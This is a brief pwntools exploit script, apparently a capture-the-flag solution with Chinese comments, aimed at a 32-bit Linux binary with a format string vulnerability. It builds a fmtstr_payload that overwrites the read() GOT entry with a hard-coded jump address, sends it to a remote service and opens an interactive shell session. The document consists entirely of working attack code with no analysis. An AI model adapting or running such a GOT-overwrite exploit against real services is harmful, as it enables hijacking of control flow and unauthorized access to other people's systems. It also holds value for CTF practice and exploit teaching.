from pwn import *

context(os ="linux",arch="i386",log_level="info")

read_got = 0x0804a00c
back =0x804859B
offset=11

io=remote(...)

io.recvuntil(b"gift:")
io.recvline()

payload = fmtstr_payload(offset, {read_got:back},write_size="byte")
#输入相应的内容可以直接构造出所需的payload
log.info("payload (%d bytes): %s", len(payload), payload)
#日志：可以看到构造出来的payload的内容

io.send(payload)

io.interactive()
